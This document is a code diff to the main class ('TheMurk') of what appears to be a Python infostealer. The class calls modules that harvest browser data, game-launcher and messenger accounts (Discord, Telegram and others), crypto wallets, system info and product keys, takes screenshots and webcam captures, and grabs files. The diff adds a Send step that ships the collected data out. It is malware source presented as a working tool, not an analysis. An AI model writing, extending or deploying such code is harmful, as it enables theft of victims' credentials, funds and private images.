@@ -18,32 +18,24 @@ from targets.system.system_info import SystemInfo
 from targets.system.productkey import ProductKey
 from targets.system.photos import Screenshot, WebCam
 from targets.wallets.wallets import Wallets
+from manager.send import Send
 
 
 
 class TheMurk:
     def __init__(self) -> None:
-        self.MainVars()
+        self.msgInfo = ["",""]#System, Other
         self.Progress()
-    
-    def MainVars(self):
-        self.name = ''
-        self.password = ''
-        self.np = []
-        self.msgSys = ""
-        self.msgBrowsers =[]
-        self.msgOther =[]
-        self.msgWallets =[]
-        self.msgFiles = []
     
     def Progress(self):
         self.Start()
-        self.GrabFiles()
         self.Browsers()
         self.Games()
         self.Messagers()
         self.Wallets()
         self.System()
+        self.GrabFiles()
+        print(self.msgInfo[0],self.msgInfo[1])
 
     def Start(self):
         if not config.debuging:
@@ -52,33 +44,36 @@ class TheMurk:
     
     def GrabFiles(self):
         if config.enableFileGrabber:
-            self.msgFiles = Grab(self.msgFiles)
+            self.msgInfo[1] += Grab()
         else:
             TxtFiles()
     
     def Browsers(self):
-        self.msgBrowsers = Chromium()
-        self.msgBrowsers = GeckoDriver(self.msgBrowsers)
+        self.msgInfo[1] += Chromium()
+        self.msgInfo[1] += GeckoDriver()
 
 
     def Games(self):
-        self.msgOther = Steam(self.msgOther)
-        self.msgOther = Epic(self.msgOther)
-        self.msgOther = Ubisoft(self.msgOther)
-        self.msgOther = Minecraft(self.msgOther)
-        self.msgOther = BattleNet(self.msgOther)
+        self.msgInfo[1] += Steam()
+        self.msgInfo[1] += Epic()
+        self.msgInfo[1] += Ubisoft()
+        self.msgInfo[1] += Minecraft()
+        self.msgInfo[1] += BattleNet()
     
     def Messagers(self):
-        self.msgOther = Discord(self.msgOther)
-        self.msgOther = Telegram(self.msgOther)
-        self.msgOther = Viber(self.msgOther)
-        self.msgOther = Pidgin(self.msgOther)
+        self.msgInfo[1] += Discord()
+        self.msgInfo[1] += Telegram()
+        self.msgInfo[1] += Viber()
+        self.msgInfo[1] += Pidgin()
+    
+    def Wallets(self):
+        self.msgInfo[1] += Wallets()
     
     def System(self):
-        self.msgSys = SystemInfo(self.msgSys)
+        self.msgInfo[0] = SystemInfo()
         ProductKey()
         Screenshot()
         WebCam()
     
-    def Wallets(self):
-        self.msgWallets = Wallets(self.msgWallets)
+    def Conclusion(self):
+        Send(config.sendData, self.msgInfo)
